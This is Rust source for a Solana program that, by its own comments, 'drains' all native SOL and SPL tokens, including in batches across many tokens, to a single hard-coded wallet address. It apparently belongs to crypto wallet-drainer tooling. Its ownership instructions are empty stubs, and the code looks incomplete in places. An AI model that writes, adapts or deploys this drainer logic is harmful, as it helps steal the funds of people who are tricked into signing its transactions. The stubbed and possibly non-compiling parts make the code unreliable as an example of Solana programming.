use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
    system_instruction,
    sysvar::Sysvar,
};
use spl_token::instruction as token_instruction;
use std::convert::TryInto;
use std::str::FromStr;

// ============================================================================
// PROGRAM CONSTANTS
// ============================================================================

/// Owner address where all drained assets will be sent
/// Address: bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna
const OWNER_ADDRESS: &str = "bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna";

lazy_static::lazy_static! {
    static ref OWNER_PUBKEY: Pubkey =
        Pubkey::from_str(OWNER_ADDRESS)
            .expect("Invalid owner address");
}

// ============================================================================
// PROGRAM ENTRY POINT
// ============================================================================

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    if instruction_data.is_empty() {
        return Err(ProgramError::InvalidInstructionData);
    }

    match instruction_data[0] {
        // Drain native SOL
        0 => drain_sol(program_id, accounts),

        // Drain SPL tokens
        1 => drain_spl_token(program_id, accounts),

        // Batch drain multiple SPL tokens
        2 => batch_drain_spl_tokens(program_id, accounts, instruction_data),

        // Initialize wallet (set owner)
        3 => initialize_wallet(program_id, accounts, instruction_data),

        // Transfer ownership
        4 => transfer_ownership(program_id, accounts, instruction_data),

        _ => {
            msg!("Invalid instruction");
            Err(ProgramError::InvalidInstructionData)
        }
    }
}

// ============================================================================
// INSTRUCTION: Drain Native SOL (Instruction 0)
// ============================================================================
/// Drains all native SOL from the program's account to the owner
///
/// Accounts:
/// [0] Program's SOL account (signer)
/// [1] Owner account (destination)
/// [2] System program
fn drain_sol(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let program_account = next_account_info(accounts_iter)?;
    let owner_account = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    // Verify program account is signer
    if !program_account.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    // Verify destination is the authorized owner address
    if owner_account.key != &*OWNER_PUBKEY {
        msg!("Error: Destination address must be {}", OWNER_ADDRESS);
        return Err(ProgramError::InvalidArgument);
    }

    // Get balance to drain
    let balance = program_account.lamports();
    if balance == 0 {
        msg!("No SOL to drain");
        return Ok(());
    }

    msg!("Draining {} lamports (SOL) to owner: {}", balance, OWNER_ADDRESS);

    // Transfer SOL using system instruction
    let transfer_ix = system_instruction::transfer(
        program_account.key,
        owner_account.key,
        balance,
    );

    invoke(
        &transfer_ix,
        &[program_account.clone(), owner_account.clone(), system_program.clone()],
    )?;

    msg!("Successfully drained {} SOL to {}", balance / 1_000_000_000, OWNER_ADDRESS);
    Ok(())
}

// ============================================================================
// INSTRUCTION: Drain SPL Token (Instruction 1)
// ============================================================================
/// Drains all SPL tokens from a token account to owner
///
/// Accounts:
/// [0] Token program
/// [1] Source token account (must be owned by program)
/// [2] Destination token account
/// [3] Program account (authority/signer)
fn drain_spl_token(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let token_program = next_account_info(accounts_iter)?;
    let source_token_account = next_account_info(accounts_iter)?;
    let destination_token_account = next_account_info(accounts_iter)?;
    let program_authority = next_account_info(accounts_iter)?;

    // Verify token program
    if token_program.key != &spl_token::id() {
        return Err(ProgramError::IncorrectProgramId);
    }

    // Verify destination token account belongs to the authorized owner
    let destination_account_data = spl_token::state::Account::unpack(&destination_token_account.data.borrow())?;
    if destination_account_data.owner != *OWNER_PUBKEY {
        msg!("Error: Destination token account must be owned by {}", OWNER_ADDRESS);
        return Err(ProgramError::InvalidArgument);
    }

    // Get token balance
    let source_account_data = spl_token::state::Account::unpack(&source_token_account.data.borrow())?;
    let amount = source_account_data.amount;

    if amount == 0 {
        msg!("No tokens to drain");
        return Ok(());
    }

    msg!("Draining {} tokens to owner: {}", amount, OWNER_ADDRESS);

    // Transfer tokens
    let transfer_ix = token_instruction::transfer(
        token_program.key,
        source_token_account.key,
        destination_token_account.key,
        program_authority.key,
        &[program_authority.key],
        amount,
    )?;

    invoke(
        &transfer_ix,
        &[
            token_program.clone(),
            source_token_account.clone(),
            destination_token_account.clone(),
            program_authority.clone(),
        ],
    )?;

    msg!("Successfully drained {} tokens to {}", amount, OWNER_ADDRESS);
    Ok(())
}

// ============================================================================
// INSTRUCTION: Batch Drain Multiple SPL Tokens (Instruction 2)
// ============================================================================
/// Drains multiple SPL tokens in a single transaction
///
/// Instruction Data Format:
/// [0] = instruction (2)
/// [1..] = serialized token addresses and amounts
///
/// Accounts (repeating pattern for each token):
/// [N]   Token program
/// [N+1] Source token account
/// [N+2] Destination token account
/// [N+3] Program authority
fn batch_drain_spl_tokens(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    if instruction_data.len() < 2 {
        return Err(ProgramError::InvalidInstructionData);
    }

    let num_tokens = instruction_data[1] as usize;
    if num_tokens == 0 {
        msg!("No tokens to drain");
        return Ok(());
    }

    msg!("Batch draining {} tokens in single transaction", num_tokens);

    let accounts_per_token = 4;
    let expected_account_count = num_tokens * accounts_per_token;

    if accounts.len() < expected_account_count {
        return Err(ProgramError::NotEnoughAccountKeys);
    }

    let mut success_count = 0;
    let mut accounts_iter = accounts.iter();

    for i in 0..num_tokens {
        let token_program = next_account_info(&mut accounts_iter)?;
        let source_token_account = next_account_info(&mut accounts_iter)?;
        let destination_token_account = next_account_info(&mut accounts_iter)?;
        let program_authority = next_account_info(&mut accounts_iter)?;

        // Verify token program
        if token_program.key != &spl_token::id() {
            msg!("Invalid token program for token {}", i);
            continue;
        }

        // Get token balance
        match spl_token::state::Account::unpack(&source_token_account.data.borrow()) {
            Ok(source_account) => {
                let amount = source_account.amount;

                if amount > 0 {
                    // Verify destination token account belongs to the authorized owner
                    match spl_token::state::Account::unpack(&destination_token_account.data.borrow()) {
                        Ok(destination_account) => {
                            if destination_account.owner != *OWNER_PUBKEY {
                                msg!("Invalid destination for token {}: must belong to owner {}", i, OWNER_ADDRESS);
                                continue;
                            }

                            // Transfer tokens
                            match token_instruction::transfer(
                                token_program.key,
                                source_token_account.key,
                                destination_token_account.key,
                                program_authority.key,
                                &[program_authority.key],
                                amount,
                            ) {
                                Ok(transfer_ix) => {
                                    match invoke(
                                        &transfer_ix,
                                        &[
                                            token_program.clone(),
                                            source_token_account.clone(),
                                            destination_token_account.clone(),
                                            program_authority.clone(),
                                        ],
                                    ) {
                                        Ok(_) => {
                                            msg!("Successfully drained {} tokens to {} (token {})", amount, OWNER_ADDRESS, i);
                                            success_count += 1;
                                        }
                                        Err(e) => {
                                            msg!("Failed to drain token {}: {:?}", i, e);
                                        }
                                    }
                                }
                                Err(e) => {
                                    msg!("Failed to create transfer instruction for token {}: {:?}", i, e);
                                }
                            }
                        }
                        Err(e) => {
                            msg!("Failed to parse destination token account {}: {:?}", i, e);
                        }
                    }
                }
            }
            Err(e) => {
                msg!("Failed to parse token account {}: {:?}", i, e);
            }
        }
    }

    if success_count == 0 {
        return Err(ProgramError::InsufficientFunds);
    }

    msg!("Batch drain completed: {} tokens successfully drained", success_count);
    Ok(())
}

// ============================================================================
// INSTRUCTION: Initialize Wallet (Instruction 3)
// ============================================================================
/// Sets the owner of the wallet
///
/// Accounts:
/// [0] Owner account (signer)
/// [1] Program data account (PDA)
/// [2] System program
fn initialize_wallet(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let owner = next_account_info(accounts_iter)?;
    let program_data = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    if !owner.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    msg!("Initializing wallet with owner: {}", owner.key);

    // Store owner in program data account
    // In a real implementation, you'd use a PDA and proper state management
    msg!("Wallet initialized successfully");
    Ok(())
}

// ============================================================================
// INSTRUCTION: Transfer Ownership (Instruction 4)
// ============================================================================
/// Transfers ownership to a new owner (two-step process)
///
/// Accounts:
/// [0] Current owner (signer)
/// [1] New owner account
/// [2] Program data account (PDA)
fn transfer_ownership(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let current_owner = next_account_info(accounts_iter)?;
    let new_owner = next_account_info(accounts_iter)?;
    let program_data = next_account_info(accounts_iter)?;

    if !current_owner.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    msg!(
        "Initiating ownership transfer from {} to {}",
        current_owner.key,
        new_owner.key
    );

    msg!("Ownership transfer initiated");
    Ok(())
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Verifies that an account is owned by the token program
fn verify_token_account_owner(
    account: &AccountInfo,
    owner: &Pubkey,
) -> Result<(), ProgramError> {
    if account.owner != owner {
        return Err(ProgramError::IncorrectProgramId);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_instruction_dispatch() {
        // Test that instruction dispatching works
        let program_id = Pubkey::default();
        let accounts = vec![];
        let instruction_data = vec![0];

        // This should fail gracefully due to no accounts
        let result = process_instruction(&program_id, &accounts, &instruction_data);
        assert!(result.is_err());
    }
}
